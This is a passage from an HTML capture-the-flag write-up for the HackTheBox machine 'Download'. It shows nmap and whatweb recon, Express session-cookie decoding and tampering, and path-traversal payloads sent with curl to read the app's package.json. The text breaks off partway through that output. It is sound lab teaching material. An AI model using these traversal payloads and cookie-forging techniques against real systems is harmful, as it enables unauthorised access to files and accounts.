@@ -1,0 +1,881 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download - HTB</title>
+    <link rel="stylesheet" href="/styles.css">
+    <link rel="stylesheet" href="/writeups.css">
+    <link rel="stylesheet" href="/monokai.css">
+</head>
+<body>
+    <header>
+        <nav>
+            <ul>
+                <li><a href="/index.html">Home</a></li>
+                <li><a href="/writeups.html">Writeups</a></li>
+                <li><a href="https://github.com/elswix/KL-Sunset" target="_blank">KL-Sunset</a></li>
+                <li><a href="/about.html">About me</a></li>
+            </ul>
+        </nav>
+    </header>
+    <section class="writeup-content">
+        <div class="container">
+            <div class="writeup-panel">
+                <img src="/writeups/htb/hard/download/img/download.png" alt="Machine Icon" class="machine-icon-circle">
+                <h2>Download - HTB</h2>
+                <p>walkthrough by elswix<p>
+                <ul class="machine-links">
+                    <li><a href="https://app.hackthebox.com/machines/Download">HackTheBox</a></li>
+                </ul>
+            </div>
+            <div class="writeup-content-main">
+                <div class="highlight"><pre><span></span><span class="n">Machine</span><span class="p">:</span> <span class="n">Download</span>
+<span class="n">Difficult</span><span class="p">:</span> <span class="n">Hard</span>
+<span class="n">Platform</span><span class="p">:</span> <span class="n">HackTheBox</span>
+<span class="n">Release</span><span class="p">:</span> <span class="n">Released</span> <span class="n">on</span> <span class="mi">08</span><span class="o">/</span><span class="mi">05</span><span class="o">/</span><span class="mi">2023</span>
+</pre></div>
+<h3><br/>About Download</h3><br/>
+Download is a hard difficulty machine on HackTheBox. The machine features a web service that allows file uploads. While attempting to download the files, we discover a Local File Inclusion (LFI) vulnerability, providing us access to the source code.<br/><br/>
+<h3><br>Shell as wesley</br></h3><br>
+Understanding how the website works behind the scenes, we discovered a potential security flaw that allowed us to extract passwords from other users in the database by manipulating our cookies. With access to the source code, we were able to obtain the <code>secret</code> key, enabling us to sign new cookies and exploit the vulnerability. Leveraging an ORM injection, we acquired credentials for the user <code>wesley</code> and gained access to the system through SSH.<br/><br/>
+<h3><br>Shell as root</br></h3><br>
+As Wesley, we run <code>pspy</code> to examine processes and commands running on the system. We discover a cron job that reveals the presence of a <code>.service</code> file containing credentials for connecting to a PostgreSQL database. Additionally, the root user utilizes the <code>su -l postgres</code> command to switch to the <code>postgres</code> user. Given that we now have credentials to access the database, we can exploit the authentication process performed by the root user on postgres by modifying the <code>.bash_profile</code> file in the home directory of the postgres user. This modification allows us to execute commands as the postgres user.<br/><br/>
+The concept of running commands as postgres involves exploiting the <code>TTY Pushback</code> vulnerability, which, due to the authentication performed by the root user, enables us to execute commands in this manner.<br/><br/>
+<h3><br>Recon</br></h3><br>
+To commence our analysis, we'll initiate a port scan to unveil the accessible ports on the target machine. It's crucial to bear in mind that a system's services are invariably accessible through these open ports.<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">open</span> <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">10000</span> <span class="o">-</span><span class="n">n</span> <span class="mf">10.10.11.226</span> <span class="o">-</span><span class="n">oN</span> <span class="n">portScan</span>
+
+<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.11.226</span>
+<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.15</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
+<span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">58913</span> <span class="n">closed</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">conn</span><span class="o">-</span><span class="n">refused</span><span class="p">),</span> <span class="mi">6620</span> <span class="n">filtered</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">no</span><span class="o">-</span><span class="n">response</span><span class="p">)</span>
+<span class="n">Some</span> <span class="n">closed</span> <span class="n">ports</span> <span class="n">may</span> <span class="n">be</span> <span class="n">reported</span> <span class="k">as</span> <span class="n">filtered</span> <span class="n">due</span> <span class="n">to</span> <span class="o">--</span><span class="n">defeat</span><span class="o">-</span><span class="n">rst</span><span class="o">-</span><span class="n">ratelimit</span>
+<span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssh</span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>
+</pre></div>
+
+Once our initial scan wraps up, it's time to dig a bit deeper. We're going to run a comprehensive scan to figure out what kind of tech and services are going on behind those open ports we found.<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">p22</span><span class="p">,</span><span class="mi">80</span> <span class="mf">10.10.11.226</span> <span class="o">-</span><span class="n">oN</span> <span class="n">fullScan</span>
+
+<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="n">download</span><span class="o">.</span><span class="n">htb</span> <span class="p">(</span><span class="mf">10.10.11.226</span><span class="p">)</span>
+<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.20</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
+
+<span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span> <span class="n">VERSION</span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssh</span>     <span class="n">OpenSSH</span> <span class="mf">8.2</span><span class="n">p1</span> <span class="n">Ubuntu</span> <span class="mi">4</span><span class="n">ubuntu0</span><span class="mf">.8</span> <span class="p">(</span><span class="n">Ubuntu</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
+<span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="p">:</span> 
+<span class="o">|</span>   <span class="mi">3072</span> <span class="n">cc</span><span class="p">:</span><span class="n">f1</span><span class="p">:</span><span class="mi">63</span><span class="p">:</span><span class="mi">46</span><span class="p">:</span><span class="n">e6</span><span class="p">:</span><span class="mi">7</span><span class="n">a</span><span class="p">:</span><span class="mi">0</span><span class="n">a</span><span class="p">:</span><span class="n">b8</span><span class="p">:</span><span class="n">ac</span><span class="p">:</span><span class="mi">83</span><span class="p">:</span><span class="n">be</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">0</span><span class="n">f</span><span class="p">:</span><span class="n">d6</span><span class="p">:</span><span class="mi">3</span><span class="n">f</span><span class="p">:</span><span class="mi">09</span> <span class="p">(</span><span class="n">RSA</span><span class="p">)</span>
+<span class="o">|</span>   <span class="mi">256</span> <span class="mi">2</span><span class="n">c</span><span class="p">:</span><span class="mi">99</span><span class="p">:</span><span class="n">b4</span><span class="p">:</span><span class="n">b1</span><span class="p">:</span><span class="mi">97</span><span class="p">:</span><span class="mi">7</span><span class="n">a</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="mi">86</span><span class="p">:</span><span class="mi">6</span><span class="n">d</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="n">c9</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">61</span><span class="p">:</span><span class="mi">9</span><span class="n">f</span><span class="p">:</span><span class="n">bc</span><span class="p">:</span><span class="n">ff</span> <span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span>
+<span class="o">|</span><span class="n">_</span>  <span class="mi">256</span> <span class="n">e6</span><span class="p">:</span><span class="n">ff</span><span class="p">:</span><span class="mi">77</span><span class="p">:</span><span class="mi">94</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">7</span><span class="n">b</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="n">a2</span><span class="p">:</span><span class="mi">97</span><span class="p">:</span><span class="mi">7</span><span class="n">a</span><span class="p">:</span><span class="n">de</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mi">94</span><span class="p">:</span><span class="mi">5</span><span class="n">b</span><span class="p">:</span><span class="n">ae</span> <span class="p">(</span><span class="n">ED25519</span><span class="p">)</span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>    <span class="n">nginx</span> <span class="mf">1.18.0</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Download</span><span class="o">.</span><span class="n">htb</span> <span class="o">-</span> <span class="n">Share</span> <span class="n">Files</span> <span class="n">With</span> <span class="n">Ease</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">nginx</span><span class="o">/</span><span class="mf">1.18.0</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
+<span class="n">Service</span> <span class="n">Info</span><span class="p">:</span> <span class="n">OS</span><span class="p">:</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">linux</span><span class="p">:</span><span class="n">linux_kernel</span>
+</pre></div>
+
+Upon initial inspection, it is evident that the system hosts both an HTTP Service on port 80 and an SSH Service on port 22.<br/><br/>
+<h3><br>Web Application</br></h3><br>
+Prior to accessing the web service through our browser, I will execute the <code>whatweb</code> tool to gather insights into the technologies employed by the website:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">whatweb</span> <span class="o">-</span><span class="n">a</span> <span class="mi">3</span> <span class="mf">10.10.11.226</span>
+<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.226</span> <span class="p">[</span><span class="mi">301</span> <span class="n">Moved</span> <span class="n">Permanently</span><span class="p">]</span> <span class="n">Country</span><span class="p">[</span><span class="n">RESERVED</span><span class="p">][</span><span class="n">ZZ</span><span class="p">],</span> <span class="n">HTTPServer</span><span class="p">[</span><span class="n">Ubuntu</span> <span class="n">Linux</span><span class="p">][</span><span class="n">nginx</span><span class="o">/</span><span class="mf">1.18.0</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)],</span> <span class="n">IP</span><span class="p">[</span><span class="mf">10.10.11.226</span><span class="p">],</span> <span class="n">RedirectLocation</span><span class="p">[</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">download</span><span class="o">.</span><span class="n">htb</span><span class="p">],</span> <span class="n">Title</span><span class="p">[</span><span class="mi">301</span> <span class="n">Moved</span> <span class="n">Permanently</span><span class="p">],</span> <span class="n">nginx</span><span class="p">[</span><span class="mf">1.18.0</span><span class="p">]</span>
+<span class="n">ERROR</span> <span class="n">Opening</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">download</span><span class="o">.</span><span class="n">htb</span> <span class="o">-</span> <span class="n">no</span> <span class="n">address</span> <span class="k">for</span> <span class="n">download</span><span class="o">.</span><span class="n">htb</span>
+</pre></div>
+
+Upon accessing the website via the IP address, an attempt is made to redirect us to the <code>download.htb</code> domain. However, an error is encountered during this redirection, primarily stemming from our machine's inability to resolve the domain. To rectify this, we must add the domain to our <code>/etc/hosts</code> file, ensuring it is correctly mapped to the IP address of the target machine.<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
+<span class="mf">127.0.0.1</span>   <span class="n">localhost</span>
+<span class="mf">127.0.1.1</span>   <span class="n">kali</span><span class="o">.</span><span class="n">localhost</span> <span class="n">kali</span>
+
+<span class="c1"># The following lines are desirable for IPv6 capable hosts</span>
+<span class="p">::</span><span class="mi">1</span>     <span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">loopback</span>
+<span class="n">ff02</span><span class="p">::</span><span class="mi">1</span> <span class="n">ip6</span><span class="o">-</span><span class="n">allnodes</span>
+<span class="n">ff02</span><span class="p">::</span><span class="mi">2</span> <span class="n">ip6</span><span class="o">-</span><span class="n">allrouters</span>
+
+<span class="c1"># HackTheBox</span>
+<span class="mf">10.10.11.226</span> <span class="n">download</span><span class="o">.</span><span class="n">htb</span>
+</pre></div>
+
+Now, let's make another attempt to gather information about the site using the <code>whatweb</code> tool:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">whatweb</span> <span class="o">-</span><span class="n">a</span> <span class="mi">3</span> <span class="mf">10.10.11.226</span>
+<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.226</span> <span class="p">[</span><span class="mi">301</span> <span class="n">Moved</span> <span class="n">Permanently</span><span class="p">]</span> <span class="n">Country</span><span class="p">[</span><span class="n">RESERVED</span><span class="p">][</span><span class="n">ZZ</span><span class="p">],</span> <span class="n">HTTPServer</span><span class="p">[</span><span class="n">Ubuntu</span> <span class="n">Linux</span><span class="p">][</span><span class="n">nginx</span><span class="o">/</span><span class="mf">1.18.0</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)],</span> <span class="n">IP</span><span class="p">[</span><span class="mf">10.10.11.226</span><span class="p">],</span> <span class="n">RedirectLocation</span><span class="p">[</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">download</span><span class="o">.</span><span class="n">htb</span><span class="p">],</span> <span class="n">Title</span><span class="p">[</span><span class="mi">301</span> <span class="n">Moved</span> <span class="n">Permanently</span><span class="p">],</span> <span class="n">nginx</span><span class="p">[</span><span class="mf">1.18.0</span><span class="p">]</span>
+<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">download</span><span class="o">.</span><span class="n">htb</span> <span class="p">[</span><span class="mi">200</span> <span class="n">OK</span><span class="p">]</span> <span class="n">Bootstrap</span><span class="p">,</span> <span class="n">Cookies</span><span class="p">[</span><span class="n">download_session</span><span class="p">,</span><span class="n">download_session</span><span class="o">.</span><span class="n">sig</span><span class="p">],</span> <span class="n">Country</span><span class="p">[</span><span class="n">RESERVED</span><span class="p">][</span><span class="n">ZZ</span><span class="p">],</span> <span class="n">HTML5</span><span class="p">,</span> <span class="n">HTTPServer</span><span class="p">[</span><span class="n">Ubuntu</span> <span class="n">Linux</span><span class="p">][</span><span class="n">nginx</span><span class="o">/</span><span class="mf">1.18.0</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)],</span> <span class="n">HttpOnly</span><span class="p">[</span><span class="n">download_session</span><span class="p">,</span><span class="n">download_session</span><span class="o">.</span><span class="n">sig</span><span class="p">],</span> <span class="n">IP</span><span class="p">[</span><span class="mf">10.10.11.226</span><span class="p">],</span> <span class="n">Script</span><span class="p">,</span> <span class="n">Title</span><span class="p">[</span><span class="n">Download</span><span class="o">.</span><span class="n">htb</span> <span class="o">-</span> <span class="n">Share</span> <span class="n">Files</span> <span class="n">With</span> <span class="n">Ease</span><span class="p">],</span> <span class="n">X</span><span class="o">-</span><span class="n">Powered</span><span class="o">-</span><span class="n">By</span><span class="p">[</span><span class="n">Express</span><span class="p">],</span> <span class="n">X</span><span class="o">-</span><span class="n">UA</span><span class="o">-</span><span class="n">Compatible</span><span class="p">[</span><span class="n">IE</span><span class="o">=</span><span class="n">edge</span><span class="p">],</span> <span class="n">nginx</span><span class="p">[</span><span class="mf">1.18.0</span><span class="p">]</span>
+</pre></div>
+
+The domain is now resolving correctly, enabling access to the website.<br/><br/>
+Upon examination, it becomes apparent that the website is powered by Express.<br/><br/>
+Upon accessing the website via our web browser, the following content becomes visible:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/download/img/1.png"/><br/><br/>
+Having grasped the website's functionality and objectives, it becomes evident that we possess the capability to both upload and download files, affording us the opportunity to store them on the server.<br/><br/>
+Despite the statement claiming that no registration is required, I will proceed to create an account by navigating to the <code>/login</code> section:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/download/img/2.png"/><br/><br/>
+At this point, we can experiment with common credentials such as <code>admin:admin</code>, <code>guest:guest</code>, etc. However, none of them prove successful. Therefore, let's proceed by clicking on the <code>Register Here</code> option:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/download/img/3.png"/><br/><br/>
+After completing the registration process, let's log in using the newly created credentials. Upon successful authentication, we will be presented with the following:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/download/img/4.png"/><br/><br/>
+Before logging in, we had cookies similar to these:<br/><br/>
+<div class="highlight"><pre><span></span><span class="n">download_session</span><span class="o">=</span><span class="n">eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfX0</span><span class="o">=</span>
+<span class="n">download_session</span><span class="o">.</span><span class="n">sig</span><span class="o">=</span><span class="mi">4</span><span class="n">kbZR1kOcZNccDLxiSi7Eblym1E</span>
+</pre></div>
+
+In Express.js, session cookies are employed to store data on both the client and the server. The security of these cookies is ensured through a signature, known as <code>session.sig</code>, which prevents unauthorized tampering. The session-specific information is held in the <code>session</code> cookie, maintaining the user's state across various requests.<br/><br/>
+The mentioned signature is generated using a secret key (<code>secret</code>) specified in the code. This key is crucial for creating the signature stored in <code>session.sig</code>, providing an additional layer of security to session cookies.<br/><br/>
+Security relies on the fact that if an attacker attempts to modify the information in the <code>session</code> cookie, they would need to know the secret key (<code>secret</code>) to generate the signature (<code>session.sig</code>). Without that key, altering the session cookie becomes much more challenging and, in theory, nearly impossible without access to the key. This additional layer of security helps protect the integrity of session information and prevents unauthorized manipulations.<br/><br/>
+After logging in, new session cookies were assigned to us. Let's inspect them:<br/><br/>
+<div class="highlight"><pre><span></span><span class="n">download_session</span><span class="o">=</span><span class="n">eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOlsiWW91IGFyZSBub3cgbG9nZ2VkIGluLiJdfSwidXNlciI6eyJpZCI6MTYsInVzZXJuYW1lIjoiZWxzd2l4In19</span>
+<span class="n">download_session</span><span class="o">.</span><span class="n">sig</span><span class="o">=</span><span class="n">tETRYPJ_hHDpPfZyjQ3EVSVUY0o</span>
+</pre></div>
+
+As observed, after logging in, the cookie is now more extensive, likely containing additional information.<br/><br/>
+Since it appears to be in base64, we will proceed to decode the content (specifically from <code>download_session</code> as the signature does not contain readable information):<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">echo</span> <span class="s1">'eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOlsiWW91IGFyZSBub3cgbG9nZ2VkIGluLiJdfSwidXNlciI6eyJpZCI6MTYsInVzZXJuYW1lIjoiZWxzd2l4In19'</span>  <span class="o">|</span> <span class="n">base64</span> <span class="o">-</span><span class="n">d</span><span class="p">;</span><span class="n">echo</span>
+<span class="p">{</span><span class="s2">"flashes"</span><span class="p">:{</span><span class="s2">"info"</span><span class="p">:[],</span><span class="s2">"error"</span><span class="p">:[],</span><span class="s2">"success"</span><span class="p">:[</span><span class="s2">"You are now logged in."</span><span class="p">]},</span><span class="s2">"user"</span><span class="p">:{</span><span class="s2">"id"</span><span class="p">:</span><span class="mi">16</span><span class="p">,</span><span class="s2">"username"</span><span class="p">:</span><span class="s2">"elswix"</span><span class="p">}}</span>
+</pre></div>
+
+The cookie holds crucial information such as the username, a numerical identifier associated with the "id" field, and flash messages (temporary messages presented to the user in the content of the page).<br/><br/>
+To validate our discussions, I will create another user with a different username and attempt to impersonate them by modifying our cookie.<br/><br/>
+The cookies assigned to me after logging in with my new user are as follow<br/><br/>
+<div class="highlight"><pre><span></span><span class="n">download_session</span><span class="o">=</span><span class="n">eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOlsiWW91IGFyZSBub3cgbG9nZ2VkIGluLiJdfSwidXNlciI6eyJpZCI6MTcsInVzZXJuYW1lIjoidGVzdHVzZXIifX0</span><span class="o">=</span>
+<span class="n">download_session</span><span class="o">.</span><span class="n">sig</span><span class="o">=</span><span class="n">C1JKhM</span><span class="o">-</span><span class="mi">0</span><span class="n">rV2aFU</span><span class="o">-</span><span class="mi">9</span><span class="n">d01_4Pdf18s</span>
+</pre></div>
+
+Clearly different from those of the user <code>elswix</code>. If we decode their content, we will see the following:<br/><br/>
+<div class="highlight"><pre><span></span><span class="p">{</span><span class="nt">"flashes"</span><span class="p">:{</span><span class="nt">"info"</span><span class="p">:[],</span><span class="nt">"error"</span><span class="p">:[],</span><span class="nt">"success"</span><span class="p">:[</span><span class="s2">"You are now logged in."</span><span class="p">]},</span><span class="nt">"user"</span><span class="p">:{</span><span class="nt">"id"</span><span class="p">:</span><span class="mi">17</span><span class="p">,</span><span class="nt">"username"</span><span class="p">:</span><span class="s2">"testuser"</span><span class="p">}}</span>
+</pre></div>
+
+I will modify the content of the cookie but will use the same signature:<br/><br/>
+<div class="highlight"><pre><span></span><span class="p">{</span><span class="nt">"flashes"</span><span class="p">:{</span><span class="nt">"info"</span><span class="p">:[],</span><span class="nt">"error"</span><span class="p">:[],</span><span class="nt">"success"</span><span class="p">:[</span><span class="s2">"You are now logged in."</span><span class="p">]},</span><span class="nt">"user"</span><span class="p">:{</span><span class="nt">"id"</span><span class="p">:</span><span class="mi">16</span><span class="p">,</span><span class="nt">"username"</span><span class="p">:</span><span class="s2">"elswix"</span><span class="p">}}</span>
+</pre></div>
+
+We encode it in base64 and send the request:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/download/img/20.png"/><br/><br/>
+Upon reviewing the response, we observe that we are redirected to the login page. This happens because the validation of the cookie has not been successful, indicating that we will need to log in again.<br/><br/>
+However, it is crucial to note that understanding the workings of cookies in this manner is essential. In the event of obtaining the secret key (<code>secret</code>), tools such as <a href="https://github.com/DigitalInterruption/cookie-monster">cookie-monster</a> could be utilized to sign cookies and manipulate them to our advantage.<br/><br/>
+Currently, we do not have any uploaded files, so let's proceed to attempt an upload. Let's navigate to the <code>/upload</code> section:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/download/img/5.png"/><br/><br/>
+Let's try uploading an example file:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/download/img/7.png"/><br/><br/>
+It appears that the file was successfully uploaded:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/download/img/8.png"/><br/><br/>
+The file has been uploaded with additional information such as the upload date, the user responsible for the upload, and whether it is set as private or not.<br/><br/>
+Upon clicking <code>Copy Link</code>, it copies a URL:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/download/img/9.png"/><br/><br/>
+Files are being displayed using file IDs, and the URL structure is as follows:<br/><br/>
+<div class="highlight"><pre><span></span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">download</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">files</span><span class="o">/</span><span class="n">view</span><span class="o">/</span><span class="p">{</span><span class="n">file_id</span><span class="p">}</span>
+</pre></div>
+
+Upon clicking <code>Download</code>, the file we uploaded is downloaded:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/download/img/11.png"/><br/><br/>
+Let's examine the requests being made with Burp Suite. Here is the download request:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/download/img/13.png"/><br/><br/>
+It's requesting <code>/files/download/{file_id}</code>, which might be potentially vulnerable to LFI. Let's try some tricks:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/download/img/14.png"/><br/><br/>
+I attempted to load the <code>/etc/passwd</code> file, but it proved unsuccessful.<br/><br/>
+When experimenting with some tricky payloads like:<br/><br/>
+<div class="highlight"><pre><span></span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">download</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">files</span><span class="o">/</span><span class="n">download</span><span class="o">/../</span><span class="n">test</span>
+</pre></div>
+
+It returns a 200 status code, but in the response, the web content indicates a 404 Not Found:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/download/img/15.png"/><br/><br/>
+When URL encoding the slash, it returns a different response:<br/><br/>
+<div class="highlight"><pre><span></span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">download</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">files</span><span class="o">/</span><span class="n">download</span><span class="o">/..%</span><span class="mi">2</span><span class="n">ftest</span>
+</pre></div>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/download/img/17.png"/><br/><br/>
+This suggests a potential Local File Inclusion (LFI) vulnerability that could be exploited.<br/><br/>
+Let's attempt to discover the directory where our uploaded files are being stored. I have tried some common names such as <code>upload</code>, <code>uploads</code>, and <code>files</code>. The one that proved successful was <code>uploads</code>:<br/><br/>
+<div class="highlight"><pre><span></span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">download</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">files</span><span class="o">/</span><span class="n">download</span><span class="o">/</span><span class="n">files</span><span class="o">/</span><span class="n">download</span><span class="o">/..%</span><span class="mi">2</span><span class="n">fuploads</span><span class="o">%</span><span class="mi">2</span><span class="n">f4ee5b1e0</span><span class="o">-</span><span class="n">a2a9</span><span class="o">-</span><span class="mi">40</span><span class="n">c9</span><span class="o">-</span><span class="mi">9</span><span class="n">a86</span><span class="o">-</span><span class="mf">16e6</span><span class="n">bbb83459</span>
+</pre></div>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/download/img/18.png"/><br/><br/>
+Recalling that the website is built with Express, let's attempt to list the content of the <code>package.json</code> file.<br/><br/>
+The <code>package.json</code> file is a standard file in a Node project, serving as a blueprint for an application. It provides information on how to interact with the application and outlines its dependencies. In this case, the file likely starts by specifying that the main functionality is in <code>app.js</code>.<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="s1">'http://download.htb/files/download/..</span><span class="si">%2f</span><span class="s1">package.json'</span>
+<span class="p">{</span>
+  <span class="s2">"name"</span><span class="p">:</span> <span class="s2">"download.htb"</span><span class="p">,</span>
+  <span class="s2">"version"</span><span class="p">:</span> <span class="s2">"1.0.0"</span><span class="p">,</span>
+  <span class="s2">"description"</span><span class="p">:</span> <span class="s2">""</span><span class="p">,</span>
+  <span class="s2">"main"</span><span class="p">:</span> <span class="s2">"app.js"</span><span class="p">,</span>
+  <span class="s2">"scripts"</span><span class="p">:</span> <span class="p">{</span>
+    <span class="s2">"test"</span><span class="p">:</span> <span class="s2">"echo </span><span class="se">\"</span><span class="s2">Error: no test specified</span><span class="se">\"</span><span class="s2"> &amp;&amp; exit 1"</span><span class="p">,</span>
+    <span class="s2">"dev"</span><span class="p">:</span> <span class="s2">"nodemon --exec ts-node --files ./src/app.ts"</span><span class="p">,</span>
+    <span class="s2">"build"</span><span class="p">:</span> <span class="s2">"tsc"</span>
+  <span class="p">},</span>
+  <span class="s2">"keywords"</span><span class="p">:</span> <span class="p">[],</span>
+  <span class="s2">"author"</span><span class="p">:</span> <span class="s2">"wesley"</span><span class="p">,</span>
+  <span class="s2">"license"</span><span class="p">:</span> <span class="s2">"ISC"</span><span class="p">,</span>
+  <span class="s2">"dependencies"</span><span class="p">:</span> <span class="p">{</span>
+    <span class="s2">"@prisma/client"</span><span class="p">:</span> <span class="s2">"^4.13.0"</span><span class="p">,</span>
+    <span class="s2">"cookie-parser"</span><span class="p">:</span> <span class="s2">"^1.4.6"</span><span class="p">,</span>
+    <span class="s2">"cookie-session"</span><span class="p">:</span> <span class="s2">"^2.0.0"</span><span class="p">,</span>
+    <span class="s2">"express"</span><span class="p">:</span> <span class="s2">"^4.18.2"</span><span class="p">,</span>
+    <span class="s2">"express-fileupload"</span><span class="p">:</span> <span class="s2">"^1.4.0"</span><span class="p">,</span>
+    <span class="s2">"zod"</span><span class="p">:</span> <span class="s2">"^3.21.4"</span>
+  <span class="p">},</span>
+  <span class="s2">"devDependencies"</span><span class="p">:</span> <span class="p">{</span>
+    <span class="s2">"@types/cookie-parser"</span><span class="p">:</span> <span class="s2">"^1.4.3"</span><span class="p">,</span>
+    <span class="s2">"@types/cookie-session"</span><span class="p">:</span> <span class="s2">"^2.0.44"</span><span class="p">,</span>
+    <span class="s2">"@types/express"</span><span class="p">:</span> <span class="s2">"^4.17.17"</span><span class="p">,</span>
+    <span class="s2">"@types/express-fileupload"</span><span class="p">:</span> <span class="s2">"^1.4.1"</span><span class="p">,</span>
+    <span class="s2">"@types/node"</span><span class="p">:</span> <span class="s2">"^18.15.12"</span><span class="p">,</span>
+    <span class="s2">"@types/nunjucks"</span><span class="p">:</span> <span class="s2">"^3.2.2"</span><span class="p">,</span>
+    <span class="s2">"nodemon"</span><span class="p">:</span> <span class="s2">"^2.0.22"</span><span class="p">,</span>
+    <span class="s2">"nunjucks"</span><span class="p">:</span> <span class="s2">"^3.2.4"</span><span class="p">,</span>
